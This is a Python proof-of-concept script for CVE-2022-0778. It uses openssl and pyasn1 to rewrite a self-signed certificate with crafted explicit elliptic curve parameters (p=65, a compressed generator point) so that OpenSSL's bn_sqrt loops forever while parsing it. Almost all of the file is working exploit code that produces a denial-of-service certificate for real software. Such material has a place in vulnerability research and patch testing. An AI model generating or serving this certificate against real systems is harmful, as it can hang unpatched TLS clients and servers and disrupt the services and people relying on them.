'''
Generate a bogus certificate with the desired elliptic curve parameters.

Requires the `openssl` binary and the `pyasn1` library.
'''
import os
from pprint import pprint
import struct
import subprocess

from pyasn1.codec.der import encoder, decoder
from pyasn1.type import univ

# Goal:
# - p = 65
# - x^3 + a*x + b = 14
# This triggers a call to `bn_sqrt(14, 65)`, which triggers the infinite loop
# oscillating between `t = 16` and `t = 61`.
SET_P = 65
SET_A = (1,)
SET_B = (12,)
# The leading 3 indicates that the generator curve point is stored in
# compressed form (giving only the X coordinate).  Decompressing the point
# (computing the Y coordinate) involves a call to `bn_sqrt`.
SET_X = (3, 1)

# Example parameters from drago-96/CVE-2022-0778
#SET_P = 697
#SET_A = (23,)
#SET_B = (0,)
#SET_X = (3, 0, 8)

def main():
    # Based on `create_cert.sh` from https://github.com/drago-96/CVE-2022-0778
    print('generating elliptic curve params: ec.key')
    subprocess.run(
            ('openssl', 'ecparam',
                '-out', 'ec.key',
                '-name', 'prime256v1',
                '-genkey',
                '-param_enc', 'explicit',
                '-conv_form', 'compressed',
                '-noout',
            ),
            check = True)
    print('generating initial certificate: cert_orig.der')
    subprocess.run(
            ('openssl', 'req', '-new', '-x509',
                '-key', 'ec.key',
                '-out', 'cert_orig.der',
                '-outform', 'DER',
                '-days', '360',
                '-subj', '/CN=TEST/',
            ),
            check = True)

    print('reading initial certificate: cert_orig.der')
    with open('cert_orig.der', 'rb') as f:
        x, rest = decoder.decode(f.read())

    cert = x
    #print(cert)
    data = cert[0]
    #print(data)
    public_key_info = data[6][0]
    public_key = public_key_info[1]
    prime_field = public_key[1]
    curve_params = public_key[2]

    print('\np:')
    prime = prime_field[1]
    print(type(prime), prime)
    prime_field[1] = univ.Integer(SET_P)
    prime = prime_field[1]
    print(type(prime), prime)

    print('\na:')
    param_a = curve_params[0]
    print(type(param_a), bytes(param_a))
    curve_params[0] = univ.OctetString(SET_A)
    param_a = curve_params[0]
    print(type(param_a), bytes(param_a))

    print('\nb:')
    param_b = curve_params[1]
    print(type(param_b), bytes(param_b))
    curve_params[1] = univ.OctetString(SET_B)
    param_b = curve_params[1]
    print(type(param_b), bytes(param_b))

    print('\nx:')
    param_x = public_key[3]
    print(type(param_x), bytes(param_x))
    public_key[3] = univ.OctetString(SET_X)
    param_x = public_key[3]
    print(type(param_x), bytes(param_x))

    print()

    print('writing modified certificate: cert.der')
    with open('cert.der', 'wb') as f:
        f.write(encoder.encode(x))

    print('converting certificate to PEM: cert.pem')
    subprocess.run(
            ('openssl', 'x509',
                '-inform', 'der',
                '-in', 'cert.der',
                '-out', 'cert.pem',
            ),
            check = True)

    print('done')

if __name__ == '__main__':
    main()

